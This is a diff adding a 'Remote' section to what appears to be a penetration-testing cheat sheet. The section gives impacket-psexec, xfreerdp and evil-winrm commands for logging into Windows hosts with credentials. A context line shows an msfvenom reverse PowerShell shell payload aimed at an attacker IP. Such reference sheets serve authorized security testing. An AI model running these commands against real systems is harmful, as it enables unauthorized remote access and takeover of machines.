@@ -530,6 +530,22 @@ msfvenom -p cmd/windows/reverse_powershell lhost=<attacker-ip> lport=<port> > sh
 </details>
 
 <details>
+  <summary><strong>Remote</strong></summary>
+
+### SMB 445
+```bash
+ impacket-psexec <user>:<password>'@<target_IP> 
+```
+### RDP 3389
+```bash
+xfreerdp /u:<user> /d:Target_Domain>  /v:<target_IP>
+```
+### WinRM 5985 
+evil-winrm -i <target_IP> -u <user> -p <password> 
+
+</details>
+
+<details>
   <summary><strong>Enumeration</strong></summary>
 
 ### Get groups
